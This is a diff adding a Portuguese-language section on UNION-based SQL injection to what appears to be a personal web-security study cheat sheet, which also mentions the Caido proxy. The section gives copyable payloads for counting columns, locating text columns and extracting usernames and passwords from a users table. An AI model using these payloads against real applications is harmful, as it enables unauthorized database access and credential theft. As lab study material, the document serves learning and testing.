@@ -211,6 +211,28 @@ WHERE category = '<span class="hl">SEU_INPUT</span>' AND released = 1</span>
     </details>
 
     <details class="acc">
+      <summary>UNION attack <span class="tag">roubar dados</span><span class="chev">▶</span></summary>
+      <div class="body">
+        <p>Cola uma <b>2ª <code>SELECT</code></b> na query pra puxar dados de <b>outras tabelas</b> (users, senhas...).</p>
+        <p class="warn">⚠ 2 regras: (1) <b>mesmo nº de colunas</b> nas duas queries; (2) <b>tipos compatíveis</b>.</p>
+        <hr class="sep">
+        <p><b>1. Contar colunas</b> — <code>ORDER BY</code> até quebrar (quebrou no N → <b>N-1 colunas</b>):</p>
+        <code class="code">' ORDER BY 1--<span class="cp">copiar</span></code>
+        <p class="muted">...incrementa 2, 3, 4... até dar 500.</p>
+        <p>Ou com NULLs (adiciona até <b>parar</b> de dar erro; nº de NULLs = nº de colunas):</p>
+        <code class="code">' UNION SELECT NULL,NULL,NULL--<span class="cp">copiar</span></code>
+        <hr class="sep">
+        <p><b>2. Achar a coluna de texto</b> — põe um texto numa posição por vez:</p>
+        <code class="code">' UNION SELECT 'a',NULL,NULL--<span class="cp">copiar</span></code>
+        <p class="muted">Sem erro + o <code>'a'</code> aparece na tela = essa coluna aceita texto.</p>
+        <hr class="sep">
+        <p><b>3. Extrair dados reais</b> — puxa colunas de outra tabela (nas posições de texto):</p>
+        <code class="code">' UNION SELECT username,password,NULL FROM users--<span class="cp">copiar</span></code>
+        <p class="muted">Na URL: espaços = <code>+</code>, fim = <code>--+-</code>.</p>
+      </div>
+    </details>
+
+    <details class="acc">
       <summary>Fluxo no Caido <span class="tag">ferramenta</span><span class="chev">▶</span></summary>
       <div class="body">
         <p><b>1.</b> Abre o Caido, seleciona o projeto. Proxy escuta em <code>127.0.0.1:8083</code>.</p>
